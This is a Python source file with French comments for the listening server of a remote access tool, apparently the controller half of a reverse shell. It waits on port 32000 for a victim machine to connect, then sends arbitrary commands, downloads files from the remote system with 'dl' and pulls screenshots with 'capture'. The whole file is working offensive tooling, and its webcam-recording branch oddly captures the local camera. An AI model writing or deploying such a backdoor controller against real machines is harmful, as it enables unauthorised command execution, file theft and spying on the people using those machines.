import socket
import cv2

HOST_IP = ""
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

# Fonction pour recevoir toutes les données
def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(chunk_len)
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
    return total_data

# Fonction pour envoyer une commande et recevoir les données
def socket_send_command_and_receive_all_data(socket_p, command):
    if not command:  # if command == ""
        return None
    socket_p.sendall(command.encode())

    header_data = socket_receive_all_data(socket_p, 13)
    longeur_data = int(header_data.decode())

    data_recues = socket_receive_all_data(socket_p, longeur_data)
    return data_recues

# Création et écoute du socket serveur
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = s.accept()
print(f"Connexion établie avec {client_address}")

dl_filename = None

# Variables pour l'enregistrement vidéo
is_recording = False
cap = None
out = None

while True:
    # Récupération des informations du client
    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
    if not infos_data:
        break

    # Saisie de la commande
    commande = input(client_address[0] + ":" + str(client_address[1]) + " " + infos_data.decode() + " > ")

    commande_split = commande.split(" ")
    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_filename = commande_split[1]
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        dl_filename = commande_split[1] + ".png"
    elif commande == "start_video":
        if not is_recording:
            print("Démarrage de l'enregistrement vidéo")
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
            is_recording = True
        else:
            print("Enregistrement vidéo déjà en cours")
        continue  # Ne pas envoyer cette commande au client

    elif commande == "stop_video":
        if is_recording:
            print("Arrêt de l'enregistrement vidéo")
            cap.release()
            out.release()
            cv2.destroyAllWindows()
            is_recording = False
        else:
            print("Aucun enregistrement vidéo en cours")
        continue  # Ne pas envoyer cette commande au client

    # Envoi de la commande au client et réception de la réponse
    data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
    if not data_recues:
        break

    if dl_filename:
        if len(data_recues) == 1 and data_recues == b" ":
            print("ERREUR: Le fichier", dl_filename, "n'existe pas")
        else:
            with open(dl_filename, "wb") as f:
                f.write(data_recues)
            print("Fichier", dl_filename, "téléchargé.")
        dl_filename = None
    else:
        print(data_recues.decode())

    # Si l'enregistrement vidéo est en cours, capturer et enregistrer les frames
    if is_recording:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
            cv2.imshow('Video', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

# Libération des ressources avant de fermer la connexion
if is_recording:
    cap.release()
    out.release()
cv2.destroyAllWindows()
s.close()
connection_socket.close()
